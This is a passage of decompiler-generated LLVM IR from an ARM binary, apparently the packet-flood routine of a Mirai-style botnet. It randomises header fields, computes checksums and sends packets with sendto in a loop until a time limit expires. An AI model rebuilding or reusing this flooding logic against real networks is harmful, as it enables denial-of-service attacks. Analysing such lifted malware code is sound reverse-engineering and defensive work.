  store i32 %v3_aa20, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v0_aa28 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa28 = add i32 %v0_aa28, 58
  store i32 %v1_aa28, i32* @r6, align 4
  store i32 %v4_aa2c, i32* %r1.global-to-local, align 4
  %v1_aa30 = add i32 %v3_aa20, 1
  store i32 %v1_aa30, i32* @r4, align 4
  store i32 %v4_aa34, i32* %r2.global-to-local, align 4
  %v9_aa38 = icmp eq i32 %v1_aa30, %arg2
  store i1 %v9_aa38, i1* %cpsr_z.global-to-local, align 1
  %v0_aa3c = load i32, i32* @r8, align 4
  %v1_aa3c = trunc i32 %v0_aa3c to i16
  %v3_aa3c = add i32 %v0_aa28, 62
  %v4_aa3c = inttoptr i32 %v3_aa3c to i16*
  store i16 %v1_aa3c, i16* %v4_aa3c, align 2
  %v0_aa40 = load i32, i32* %r1.global-to-local, align 4
  %v1_aa40 = trunc i32 %v0_aa40 to i16
  %v2_aa40 = load i32, i32* @r6, align 4
  %v3_aa40 = inttoptr i32 %v2_aa40 to i16*
  store i16 %v1_aa40, i16* %v3_aa40, align 2
  %v0_aa44 = load i32, i32* %r2.global-to-local, align 4
  %v1_aa44 = trunc i32 %v0_aa44 to i16
  %v2_aa44 = load i32, i32* @r6, align 4
  %v3_aa44 = add i32 %v2_aa44, 2
  %v4_aa44 = inttoptr i32 %v3_aa44 to i16*
  store i16 %v1_aa44, i16* %v4_aa44, align 2
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %stack_var_-44, align 4
  %v5_aa4c = icmp slt i32 %v1_aa30, %arg2
  br i1 %v5_aa4c, label %dec_label_pc_a8f4, label %dec_label_pc_aa50.preheader

dec_label_pc_aa50.preheader:                      ; preds = %bb80, %dec_label_pc_a814
  %v1_aa6c = add i32 %v5_a764, 8
  %v1_aa70 = add i32 %v5_a764, 66
  %v2_aa7c = icmp eq i32 %v5_a7b8, -1
  %v7_aa7c = icmp eq i32 %v5_a7b8, -1
  %v9_ac74 = icmp eq i32 %v3_a82c, add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1)
  %v2_acc4 = icmp eq i32 %v1_a828, 0
  %v2_aad8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_aaf0 = ptrtoint i32* %stack_var_-52 to i32
  %v2_ab00 = ptrtoint i32* %stack_var_-56 to i32
  %v2_ab0c = ptrtoint i32* %stack_var_-54 to i32
  %v2_ab20 = icmp eq i32 %v1_a784, 0
  br label %dec_label_pc_aa50

dec_label_pc_aa50:                                ; preds = %dec_label_pc_aa50.preheader, %dec_label_pc_ad04
  store i1 %v2_a838, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a838, label %dec_label_pc_ad04, label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_aa50
  store i32 %v5_a764, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_aa6c, i32* @fp, align 4
  store i32 %v1_aa70, i32* @sb, align 4
  br label %dec_label_pc_abd8

dec_label_pc_aa78:                                ; preds = %dec_label_pc_abd8
  store i32 %v5_a7b8, i32* %r1.global-to-local, align 4
  store i1 %v7_aa7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa7c, label %dec_label_pc_ac64, label %dec_label_pc_aa84

dec_label_pc_aa84:                                ; preds = %dec_label_pc_ac04, %dec_label_pc_aa78
  store i32 %v3_a82c, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_ac74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac74, label %dec_label_pc_ac80, label %dec_label_pc_aa98

dec_label_pc_aa98:                                ; preds = %dec_label_pc_ac64.dec_label_pc_aa98_crit_edge, %dec_label_pc_aa84
  %v1_aa9c = phi i32 [ %v1_aa9c.pre, %dec_label_pc_ac64.dec_label_pc_aa98_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), %dec_label_pc_aa84 ]
  store i32 %v3_a830, i32* %r3.global-to-local, align 4
  %v9_aa9c = icmp eq i32 %v3_a830, %v1_aa9c
  store i1 %v9_aa9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa9c, label %dec_label_pc_aca8, label %dec_label_pc_aaa4

dec_label_pc_aaa4:                                ; preds = %dec_label_pc_ac80, %dec_label_pc_aa98
  %v1_aaa8 = phi i32 [ %v1_aca0, %dec_label_pc_ac80 ], [ %v1_aa9c, %dec_label_pc_aa98 ]
  store i32 %v3_a834, i32* %ip.global-to-local, align 4
  %v9_aaa8 = icmp eq i32 %v3_a834, %v1_aaa8
  store i1 %v9_aaa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aaa8, label %dec_label_pc_acbc, label %dec_label_pc_aab0

dec_label_pc_aab0:                                ; preds = %dec_label_pc_aca8, %dec_label_pc_aaa4
  store i32 %v1_a828, i32* @lr, align 4
  store i1 %v2_acc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acc4, label %dec_label_pc_acd8, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_aab0
  %v1_aab8 = load i32, i32* @r5, align 4
  %v2_aab8 = add i32 %v1_aab8, 16
  %v3_aab8 = inttoptr i32 %v2_aab8 to i32*
  %v4_aab8 = load i32, i32* %v3_aab8, align 4
  store i32 %v4_aab8, i32* %r3.global-to-local, align 4
  %v2_aabc = load i32, i32* @r6, align 4
  %v3_aabc = add i32 %v2_aabc, 16
  %v4_aabc = inttoptr i32 %v3_aabc to i32*
  store i32 %v4_aab8, i32* %v4_aabc, align 4
  br label %dec_label_pc_aac4

dec_label_pc_aac4:                                ; preds = %bb81, %.thread11, %dec_label_pc_acd8
  %v0_aac4 = call i32 @rand_next()
  store i32 %v0_aac4, i32* %r0.global-to-local, align 4
  store i32 %v0_aac4, i32* %stack_var_-48, align 4
  %v0_aacc = call i32 @rand_next()
  store i32 %v0_aacc, i32* %r0.global-to-local, align 4
  store i32 %v0_aacc, i32* %stack_var_-52, align 4
  %v0_aad4 = call i32 @rand_next()
  store i32 %v2_aad8, i32* %r1.global-to-local, align 4
  store i32 %v0_aad4, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_aae4 = load i32, i32* @r7, align 4
  store i32 %v0_aae4, i32* %r0.global-to-local, align 4
  %v3_aae8 = call i32 @util_memcpy(i32 %v0_aae4, i32 %v2_aad8, i32 4)
  %v0_aaec = load i32, i32* @r7, align 4
  %v1_aaec = add i32 %v0_aaec, 6
  store i32 %v1_aaec, i32* %r0.global-to-local, align 4
  store i32 %v2_aaf0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_aaf8 = call i32 @util_memcpy(i32 %v1_aaec, i32 %v2_aaf0, i32 4)
  %v0_aafc = load i32, i32* @r7, align 4
  %v1_aafc = add i32 %v0_aafc, 4
  store i32 %v1_aafc, i32* %r0.global-to-local, align 4
  store i32 %v2_ab00, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ab08 = call i32 @util_memcpy(i32 %v1_aafc, i32 %v2_ab00, i32 2)
  store i32 %v2_ab0c, i32* %r1.global-to-local, align 4
  %v0_ab10 = load i32, i32* @r7, align 4
  %v1_ab10 = add i32 %v0_ab10, 10
  store i32 %v1_ab10, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ab18 = call i32 @util_memcpy(i32 %v1_ab10, i32 %v2_ab0c, i32 2)
  store i32 %v3_ab18, i32* %r0.global-to-local, align 4
  store i32 %v1_a784, i32* %r1.global-to-local, align 4
  store i1 %v2_ab20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ab20, label %dec_label_pc_ab28, label %dec_label_pc_ace4

dec_label_pc_ab28:                                ; preds = %dec_label_pc_aac4, %dec_label_pc_ace4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ab2c = load i32, i32* @r5, align 4
  %v3_ab2c = add i32 %v2_ab2c, 10
  %v4_ab2c = inttoptr i32 %v3_ab2c to i16*
  store i16 0, i16* %v4_ab2c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ab34 = load i32, i32* @r5, align 4
  store i32 %v0_ab34, i32* @r0, align 4
  %v2_ab38 = call i32 @checksum_generic(i32 %v0_ab34, i32 20)
  %v3_ab38 = trunc i32 %v2_ab38 to i16
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_ab40 = load i32, i32* @r5, align 4
  %v4_ab40 = add i32 %v3_ab40, 10
  %v5_ab40 = inttoptr i32 %v4_ab40 to i16*
  store i16 %v3_ab38, i16* %v5_ab40, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ab48 = load i32, i32* %ip.global-to-local, align 4
  %v1_ab48 = trunc i32 %v0_ab48 to i16
  %v2_ab48 = load i32, i32* @r6, align 4
  %v3_ab48 = add i32 %v2_ab48, 10
  %v4_ab48 = inttoptr i32 %v3_ab48 to i16*
  store i16 %v1_ab48, i16* %v4_ab48, align 2
  %v0_ab4c = load i32, i32* @r6, align 4
  store i32 %v0_ab4c, i32* @r0, align 4
  %v2_ab50 = call i32 @checksum_generic(i32 %v0_ab4c, i32 20)
  %v3_ab50 = trunc i32 %v2_ab50 to i16
  store i32 %v2_ab50, i32* %r0.global-to-local, align 4
  %v3_ab54 = load i32, i32* @r6, align 4
  %v4_ab54 = add i32 %v3_ab54, 10
  %v5_ab54 = inttoptr i32 %v4_ab54 to i16*
  store i16 %v3_ab50, i16* %v5_ab54, align 2
  %v2_ab5c = load i32, i32* @r8, align 4
  %v3_ab5c = add i32 %v2_ab5c, 6
  %v4_ab5c = inttoptr i32 %v3_ab5c to i16*
  store i16 0, i16* %v4_ab5c, align 2
  %v0_ab60 = load i32, i32* @r8, align 4
  store i32 %v0_ab60, i32* @r1, align 4
  %v1_ab64 = add i32 %v0_ab60, 4
  %v2_ab64 = inttoptr i32 %v1_ab64 to i16*
  %v3_ab64 = load i16, i16* %v2_ab64, align 2
  %v4_ab64 = zext i16 %v3_ab64 to i32
  store i32 %v4_ab64, i32* %r2.global-to-local, align 4
  %v0_ab68 = load i32, i32* @fp, align 4
  store i32 %v0_ab68, i32* %r3.global-to-local, align 4
  %v0_ab6c = load i32, i32* @r6, align 4
  store i32 %v0_ab6c, i32* %r0.global-to-local, align 4
  %v4_ab70 = call i32 @checksum_tcpudp(i32 %v0_ab6c, i32 %v0_ab60, i32 %v4_ab64, i32 %v0_ab68)
  %v5_ab70 = trunc i32 %v4_ab70 to i16
  store i32 %v4_ab70, i32* %r0.global-to-local, align 4
  %v3_ab74 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab74, i32* %r2.global-to-local, align 4
  %v3_ab78 = mul i32 %v3_ab74, 32
  store i32 %v3_ab78, i32* %r3.global-to-local, align 4
  %v0_ab7c = load i32, i32* @r5, align 4
  %v1_ab7c = add i32 %v0_ab7c, 16
  %v2_ab7c = inttoptr i32 %v1_ab7c to i32*
  %v3_ab7c = load i32, i32* %v2_ab7c, align 4
  %v5_ab80 = mul i32 %v3_ab74, 24
  store i32 %v5_ab80, i32* %r3.global-to-local, align 4
  %v1_ab84 = load i32, i32* @sl, align 4
  %v2_ab84 = add i32 %v1_ab84, %v5_ab80
  store i32 %v2_ab84, i32* @lr, align 4
  %v2_ab88 = add i32 %v2_ab84, 4
  %v3_ab88 = inttoptr i32 %v2_ab88 to i32*
  store i32 %v3_ab7c, i32* %v3_ab88, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_ab94 = load i32, i32* @r8, align 4
  %v4_ab94 = add i32 %v3_ab94, 6
  %v5_ab94 = inttoptr i32 %v4_ab94 to i16*
  store i16 %v5_ab70, i16* %v5_ab94, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ab9c = load i32, i32* %r1.global-to-local, align 4
  %v1_ab9c = trunc i32 %v0_ab9c to i16
  %v2_ab9c = load i32, i32* %r3.global-to-local, align 4
  %v3_ab9c = load i32, i32* @sl, align 4
  %v4_ab9c = add i32 %v3_ab9c, %v2_ab9c
  %v5_ab9c = inttoptr i32 %v4_ab9c to i16*
  store i16 %v1_ab9c, i16* %v5_ab9c, align 2
  %v0_aba0 = load i32, i32* %r2.global-to-local, align 4
  %v1_aba0 = trunc i32 %v0_aba0 to i16
  %v2_aba0 = load i32, i32* @lr, align 4
  %v3_aba0 = add i32 %v2_aba0, 2
  %v4_aba0 = inttoptr i32 %v3_aba0 to i16*
  store i16 %v1_aba0, i16* %v4_aba0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_aba8 = load i32, i32* @r5, align 4
  store i32 %v0_aba8, i32* %r1.global-to-local, align 4
  store i32 %v3_a7dc, i32* %r0.global-to-local, align 4
  %v0_abb0 = load i32, i32* @sb, align 4
  store i32 %v0_abb0, i32* %r2.global-to-local, align 4
  %v0_abb4 = load i32, i32* @lr, align 4
  %v0_abb8 = load i32, i32* %ip.global-to-local, align 4
  %v6_abbc = call i32 @__libc_sendto(i32 %v3_a7dc, i32 %v0_aba8, i32 %v0_abb0, i32 16384, i32 %v0_abb4, i32 %v0_abb8)
  %v3_abc0 = load i32, i32* %stack_var_-44, align 4
  %v1_abc4 = add i32 %v3_abc0, 1
  store i32 %v1_abc4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_abcc = icmp eq i32 %v1_abc4, %arg2
  store i1 %v9_abcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_abc4, i32* %stack_var_-44, align 4
  %v6_abd4 = icmp slt i32 %v1_abc4, %arg2
  br i1 %v6_abd4, label %dec_label_pc_abd8, label %dec_label_pc_ad04

dec_label_pc_abd8:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_aa64
  %v1_abec = phi i32 [ %v1_abc4, %dec_label_pc_ab28 ], [ 0, %dec_label_pc_aa64 ]
  %v5_abdc = mul i32 %v1_abec, 24
  %v1_abe0 = load i32, i32* @sl, align 4
  %v2_abe0 = add i32 %v1_abe0, %v5_abdc
  store i32 %v2_abe0, i32* %r3.global-to-local, align 4
  store i32 %v2_a698, i32* %lr.global-to-local, align 4
  %v1_abe8 = add i32 %v2_abe0, 20
  %v2_abe8 = inttoptr i32 %v1_abe8 to i8*
  %v3_abe8 = load i8, i8* %v2_abe8, align 1
  %v4_abe8 = zext i8 %v3_abe8 to i32
  store i32 %v4_abe8, i32* %r2.global-to-local, align 4
  %v4_abec = mul i32 %v1_abec, 4
  %v5_abec = add i32 %v4_abec, %v2_a698
  %v6_abec = inttoptr i32 %v5_abec to i32*
  %v7_abec = load i32, i32* %v6_abec, align 4
  store i32 %v7_abec, i32* @r5, align 4
  %v2_abf0 = icmp ugt i8 %v3_abe8, 30
  %v7_abf0 = icmp eq i8 %v3_abe8, 31
  store i1 %v7_abf0, i1* %cpsr_z.global-to-local, align 1
  %v1_abf4 = add i32 %v7_abec, 24
  store i32 %v1_abf4, i32* @r7, align 4
  %v1_abf8 = add i32 %v7_abec, 38
  store i32 %v1_abf8, i32* @r6, align 4
  %v1_abfc = add i32 %v7_abec, 58
  store i32 %v1_abfc, i32* @r8, align 4
  %v2_ac00 = xor i1 %v7_abf0, true
  %v3_ac00 = and i1 %v2_abf0, %v2_ac00
  br i1 %v3_ac00, label %dec_label_pc_aa78, label %dec_label_pc_ac04

dec_label_pc_ac04:                                ; preds = %dec_label_pc_abd8
  %v1_ac04 = add i32 %v2_abe0, 16
  %v2_ac04 = inttoptr i32 %v1_ac04 to i32*
  %v3_ac04 = load i32, i32* %v2_ac04, align 4
  store i32 %v3_ac04, i32* %r4.global-to-local, align 4
  %v0_ac08 = call i32 @rand_next()
  store i32 %v0_ac08, i32* %r0.global-to-local, align 4
  %v3_ac0c = load i32, i32* %stack_var_-44, align 4
  %v5_ac14 = mul i32 %v3_ac0c, 24
  %v1_ac18 = and i32 %v3_ac04, 16711680
  store i32 %v1_ac18, i32* %ip.global-to-local, align 4
  %v3_ac1c = udiv i32 %v3_ac04, 16777216
  %v4_ac20 = udiv i32 %v1_ac18, 256
  %v5_ac20 = or i32 %v4_ac20, %v3_ac1c
  store i32 %v5_ac20, i32* %r2.global-to-local, align 4
  %v1_ac24 = load i32, i32* @sl, align 4
  %v2_ac24 = add i32 %v1_ac24, %v5_ac14
  store i32 %v2_ac24, i32* %r1.global-to-local, align 4
  %v1_ac28 = and i32 %v3_ac04, 65280
  store i32 %v1_ac28, i32* %r3.global-to-local, align 4
  %v1_ac2c = add i32 %v2_ac24, 20
  %v2_ac2c = inttoptr i32 %v1_ac2c to i8*
  %v3_ac2c = load i8, i8* %v2_ac2c, align 1
  %v4_ac2c = zext i8 %v3_ac2c to i32
  store i32 %v4_ac2c, i32* %ip.global-to-local, align 4
  %v5_ac34 = call i32 @llvm.bswap.i32(i32 %v3_ac04)
  %v7_ac38 = lshr i32 %v0_ac08, %v4_ac2c
  %v8_ac38 = add i32 %v7_ac38, %v5_ac34
  store i32 %v8_ac38, i32* %r2.global-to-local, align 4
  %v1_ac3c = and i32 %v8_ac38, 16711680
  store i32 %v1_ac3c, i32* %r0.global-to-local, align 4
  store i32 %v5_a7b8, i32* %r1.global-to-local, align 4
  %v5_ac54 = call i32 @llvm.bswap.i32(i32 %v8_ac38)
  store i32 %v5_ac54, i32* %r3.global-to-local, align 4
  store i1 %v7_aa7c, i1* %cpsr_z.global-to-local, align 1
  %v1_ac5c = load i32, i32* @r5, align 4
  %v2_ac5c = add i32 %v1_ac5c, 16
  %v3_ac5c = inttoptr i32 %v2_ac5c to i32*
  store i32 %v5_ac54, i32* %v3_ac5c, align 4
  br i1 %v2_aa7c, label %dec_label_pc_ac64, label %dec_label_pc_aa84

dec_label_pc_ac64:                                ; preds = %dec_label_pc_ac04, %dec_label_pc_aa78
  %v0_ac64 = call i32 @rand_next()
  store i32 %v0_ac64, i32* %r0.global-to-local, align 4
  store i32 %v3_a82c, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_ac74, i1* %cpsr_z.global-to-local, align 1
  %v1_ac78 = load i32, i32* @r5, align 4
  %v2_ac78 = add i32 %v1_ac78, 12
  %v3_ac78 = inttoptr i32 %v2_ac78 to i32*
  store i32 %v0_ac64, i32* %v3_ac78, align 4
  br i1 %v9_ac74, label %dec_label_pc_ac80, label %dec_label_pc_ac64.dec_label_pc_aa98_crit_edge

dec_label_pc_ac64.dec_label_pc_aa98_crit_edge:    ; preds = %dec_label_pc_ac64
  %v1_aa9c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_aa98

dec_label_pc_ac80:                                ; preds = %dec_label_pc_ac64, %dec_label_pc_aa84
  %v0_ac80 = call i32 @rand_next()
  %v3_ac88 = urem i32 %v0_ac80, 65536
  store i32 %v3_ac88, i32* %r0.global-to-local, align 4
  %v1_ac90 = sub nsw i32 999, %v3_ac88
  store i32 %v1_ac90, i32* %r3.global-to-local, align 4
  %v1_ac94 = trunc i32 %v0_ac80 to i16
  %v2_ac94 = load i32, i32* @r5, align 4
  %v3_ac94 = add i32 %v2_ac94, 4
  %v4_ac94 = inttoptr i32 %v3_ac94 to i16*
  store i16 %v1_ac94, i16* %v4_ac94, align 2
  %v0_ac98 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac98 = trunc i32 %v0_ac98 to i16
  %v2_ac98 = load i32, i32* @r6, align 4
  %v3_ac98 = add i32 %v2_ac98, 4
  %v4_ac98 = inttoptr i32 %v3_ac98 to i16*
  store i16 %v1_ac98, i16* %v4_ac98, align 2
  store i32 %v3_a830, i32* %r3.global-to-local, align 4
  %v1_aca0 = load i32, i32* @r4, align 4
  %v9_aca0 = icmp eq i32 %v3_a830, %v1_aca0
  store i1 %v9_aca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aca0, label %dec_label_pc_aca8, label %dec_label_pc_aaa4

dec_label_pc_aca8:                                ; preds = %dec_label_pc_ac80, %dec_label_pc_aa98
  %v0_aca8 = call i32 @rand_next()
  %v1_aca8 = trunc i32 %v0_aca8 to i16
  store i32 %v0_aca8, i32* %r0.global-to-local, align 4
  store i32 %v3_a834, i32* %ip.global-to-local, align 4
  %v1_acb0 = load i32, i32* @r4, align 4
  %v9_acb0 = icmp eq i32 %v3_a834, %v1_acb0
  store i1 %v9_acb0, i1* %cpsr_z.global-to-local, align 1
  %v3_acb4 = load i32, i32* @r5, align 4
  %v4_acb4 = add i32 %v3_acb4, 58
  %v5_acb4 = inttoptr i32 %v4_acb4 to i16*
  store i16 %v1_aca8, i16* %v5_acb4, align 2
  br i1 %v9_acb0, label %dec_label_pc_acbc, label %dec_label_pc_aab0

dec_label_pc_acbc:                                ; preds = %dec_label_pc_aca8, %dec_label_pc_aaa4
  %v0_acbc = call i32 @rand_next()
  %v1_acbc = trunc i32 %v0_acbc to i16
  store i32 %v0_acbc, i32* %r0.global-to-local, align 4
  store i32 %v1_a828, i32* @lr, align 4
  store i1 %v2_acc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acc4, label %.thread24, label %bb81

.thread24:                                        ; preds = %dec_label_pc_acbc
  %v3_accc25 = load i32, i32* @r8, align 4
  %v4_accc26 = add i32 %v3_accc25, 2
  %v5_accc27 = inttoptr i32 %v4_accc26 to i16*
  store i16 %v1_acbc, i16* %v5_accc27, align 2
  br label %dec_label_pc_acd8

bb81:                                             ; preds = %dec_label_pc_acbc
  %v1_acc8 = load i32, i32* @r5, align 4
  %v2_acc8 = add i32 %v1_acc8, 16
  %v3_acc8 = inttoptr i32 %v2_acc8 to i32*
  %v4_acc8 = load i32, i32* %v3_acc8, align 4
  store i32 %v4_acc8, i32* %r3.global-to-local, align 4
  %v3_accc = load i32, i32* @r8, align 4
  %v4_accc = add i32 %v3_accc, 2
  %v5_accc = inttoptr i32 %v4_accc to i16*
  store i16 %v1_acbc, i16* %v5_accc, align 2
  %v1_acd0 = load i32, i32* %r3.global-to-local, align 4
  %v2_acd0 = load i32, i32* @r6, align 4
  %v3_acd0 = add i32 %v2_acd0, 16
  %v4_acd0 = inttoptr i32 %v3_acd0 to i32*
  store i32 %v1_acd0, i32* %v4_acd0, align 4
  br label %dec_label_pc_aac4

dec_label_pc_acd8:                                ; preds = %.thread24, %dec_label_pc_aab0
  %v0_acd8 = call i32 @rand_next()
  store i32 %v0_acd8, i32* %r0.global-to-local, align 4
  %v1_acdc = load i32, i32* @r6, align 4
  %v2_acdc = add i32 %v1_acdc, 16
  %v3_acdc = inttoptr i32 %v2_acdc to i32*
  store i32 %v0_acd8, i32* %v3_acdc, align 4
  br label %dec_label_pc_aac4

dec_label_pc_ace4:                                ; preds = %dec_label_pc_aac4
  %v0_ace4 = load i32, i32* @r8, align 4
  %v1_ace4 = add i32 %v0_ace4, 8
  store i32 %v1_ace4, i32* @r4, align 4
  store i32 %v1_ace4, i32* %r0.global-to-local, align 4
  store i32 %v5_a764, i32* %r1.global-to-local, align 4
  %v2_acf0 = call i32 @rand_alphastr(i32 %v1_ace4, i32 %v5_a764)
  store i32 %v2_acf0, i32* %r0.global-to-local, align 4
  store i32 %v5_a764, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_acfc = load i32, i32* @r4, align 4
  %v4_acfc = add i32 %v2_acfc, %v5_a764
  %v5_acfc = inttoptr i32 %v4_acfc to i8*
  store i8 0, i8* %v5_acfc, align 1
  br label %dec_label_pc_ab28

dec_label_pc_ad04:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_aa50
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ad08 = call i32 @__GI_time(i32* null)
  store i32 %v2_ad08, i32* %r0.global-to-local, align 4
  store i32 %v2_a7c8, i32* %ip.global-to-local, align 4
  %v9_ad10 = icmp eq i32 %v2_a7c8, %v2_ad08
  store i1 %v9_ad10, i1* %cpsr_z.global-to-local, align 1
  %v6_ad14 = icmp slt i32 %v2_a7c8, %v2_ad08
  br i1 %v6_ad14, label %dec_label_pc_ad18, label %dec_label_pc_aa50

dec_label_pc_ad18:                                ; preds = %dec_label_pc_ad04, %entry, %dec_label_pc_ad24
  %v1_ad20 = phi i32 [ %v3_a7dc, %entry ], [ %v1_ad28, %dec_label_pc_ad24 ], [ %v2_ad08, %dec_label_pc_ad04 ]
  store i32 %v3_a66c, i32* %r4.global-to-local, align 4
  store i32 %v24_a66c, i32* %fp.global-to-local, align 4
  store i32 %v27_a66c, i32* %lr.global-to-local, align 4
  ret i32 %v1_ad20

dec_label_pc_ad24:                                ; preds = %dec_label_pc_a7ec
  store i32 %v3_a7dc, i32* %r0.global-to-local, align 4
  %v1_ad28 = call i32 @__GI___libc_close(i32 %v3_a7dc)
  store i32 %v1_ad28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad18

; uselistorder directives
  uselistorder i32 %v1_ad28, { 1, 0 }
  uselistorder i16 %v1_acbc, { 1, 0 }
  uselistorder i32 %v0_acbc, { 1, 0 }
  uselistorder i32 %v0_aca8, { 1, 0 }
  uselistorder i32 %v1_aca0, { 1, 0 }
  uselistorder i32 %v3_ac88, { 1, 0 }
  uselistorder i32 %v0_ac80, { 1, 0 }
  uselistorder i32 %v5_ac54, { 1, 0 }
  uselistorder i32 %v3_ac04, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v7_abec, { 2, 1, 0, 3 }
  uselistorder i32 %v1_abc4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_ab74, { 1, 0, 2 }
  uselistorder i32 %v4_ab70, { 1, 0 }
  uselistorder i32 %v2_ab50, { 1, 0 }
  uselistorder i1 %v2_acc4, { 2, 3, 1, 0 }
  uselistorder i1 %v9_ac74, { 2, 3, 1, 0 }
  uselistorder i1 %v7_aa7c, { 2, 1, 0 }
  uselistorder i32 %v0_a9fc, { 1, 0, 2 }
  uselistorder i32 %v0_a914, { 1, 2, 0 }
  uselistorder i32 %tmp68, { 1, 0 }
  uselistorder i32 %v1_a868, { 2, 0, 1 }
  uselistorder i32 %v3_a860, { 2, 1, 0 }
  uselistorder i1 %v2_a838, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a82c, { 2, 1, 3, 0 }
  uselistorder i32 %v1_a828, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v0_a824, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_a820, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a81c, { 1, 0 }
  uselistorder i1 %v7_a80c, { 1, 0 }
  uselistorder i1 %v7_a7e0, { 1, 0 }
  uselistorder i32 %v3_a7dc, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_a7c8, { 2, 1, 0 }
  uselistorder i32 %v5_a7b8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_a784, { 1, 2, 0 }
  uselistorder i32 %v5_a764, { 1, 4, 3, 2, 5, 7, 6, 0 }
  uselistorder i32 %v6_a730, { 1, 0, 3, 2 }
  uselistorder i32 %v1_a718, { 1, 0 }
  uselistorder i32 %v1_a6f4, { 2, 1, 0 }
  uselistorder i32 %v5_a6ec, { 1, 0 }
  uselistorder i8 %v5_a6d0, { 0, 2, 1 }
  uselistorder i32 %v6_a6b0, { 1, 0 }
  uselistorder i32 %v2_a698, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 19, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 7, 9, 10, 8, 12, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 22, 23, 24, 26, 25, 30, 27, 28, 29, 33, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 13, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg2, { 6, 5, 4, 1, 0, 3, 2, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_ad18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ab28, { 1, 0 }
  uselistorder label %dec_label_pc_aac4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa50, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

